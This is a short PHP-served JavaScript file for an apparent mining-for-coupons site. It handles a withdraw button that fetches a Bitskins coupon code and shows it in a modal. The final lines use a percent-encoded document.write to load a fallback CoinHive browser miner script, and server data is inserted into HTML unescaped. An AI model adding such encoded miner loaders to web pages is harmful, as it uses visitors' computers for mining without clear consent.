 <?php header("Content-type: application/javascript"); 
 
 ?>
$(".button-collapse").sideNav();
$('#withdraw').on('click', function(){
	$.ajax({
  	type: "POST",
  	url: 'createcoupon.php',
  	data: {
  	amount : $('#amount').val()
  },
  	success: function(data){
  	console.log('success')
  		$('body').append('<div id="coupon" class="modal"><div class="modal-content"><h4>Your Coupon</h4><p>Here is your coupon for Bitskins, write down the code right now. The code will not be retrievable after you close this window, however this does NOT mean you can\'t redeem it later. Go to <a target="_blank" href="https://bitskins.com/wallet">Bitskins</a> to redeem the coupon.</p><span style="font-size:2rem;" class="clip yellow darken-1" data-clipboard-text='+data+'>'+data+'</span></div><div class="modal-footer"><a href="#!" class="modal-action modal-close waves-effect waves-green btn-flat">Close</a></div></div>');
  var clipboard = new Clipboard('.clip');
  clipboard.on('success', function(e) {
        console.log(e);
    });
    $('.modal').modal({
      dismissible: false
    });
    $('#coupon').modal('open');
  	},
	});
})

if (typeof CoinHive == 'undefined') {
    document.write(unescape("%3Cscript src='/fallbackhive.js' type='text/javascript'%3E%3C/script%3E"));
}
